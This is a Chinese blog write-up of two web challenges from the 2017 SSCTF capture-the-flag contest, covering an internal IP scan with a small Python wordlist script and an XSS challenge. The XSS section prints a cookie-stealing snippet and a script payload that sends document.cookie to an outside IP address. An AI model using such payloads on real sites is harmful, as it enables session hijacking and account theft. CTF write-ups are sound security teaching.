---
title: 2017 SSCTF Writeup
tags: [write-up]
date: 2017-05-08 00:20
---
2017 SSCTF Writeup
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>这周两场比赛赶在了一起，ssctf没来的急打，现在补一下。</p>
<h1 id="web">WEB</h1>
<h2 id="0x01-捡吗">0x01 捡吗？</h2>
<p>本题是道内网访问的题目少不了的就是内网扫描 <br>
首先生成字典</br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'1.txt'</span>,<span class="hljs-string">'w'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">255</span>):
    f.<span class="hljs-built_in">write</span>(str(i)+<span class="hljs-string">'\n'</span>)</code></pre>
<p>利用burpsuit爆破 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507230001271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现了网段中的可靠ip 190 <br>
后来等hint放出来  <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507230310803?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
直接访问ftp这里用大写 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507230409006?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507230538585?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></br></img></br></br></br></img></br></p>
<h2 id="弹幕">弹幕</h2>
<p>一道xss的题目，在网页刚开始刷新的时会出现一个弹框 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507235446936?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507235455389?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></p>
<p>里面的内容是 <br>
<code>&lt;img src="/static/images/welcome.gif" onload="c=encodeURIComponent(document.cookie);if(c.length&gt;32){a=new Image();a.src='/xssHentai/request/1/?body='+c;}"&gt;</code></br></p>
<p>输入<code>http://117.34.71.7/xssHentai/</code>是个登录界面最简单的注入注进去 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507235831517?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<pre class="prettyprint"><code class=" hljs asciidoc">构造payload
&lt;script&gt;var img =new Image();img.src = "<span class="hljs-link_url">http://45.78.29.252:8888/?a="+document.cookie;document.getElementsByTagName("head")</span>[<span class="hljs-link_label">0</span>].appendChild(img);&lt;/script&gt;</code></pre>
<p>发现中间如果是4不行如果是1可以接收到flag</p></div>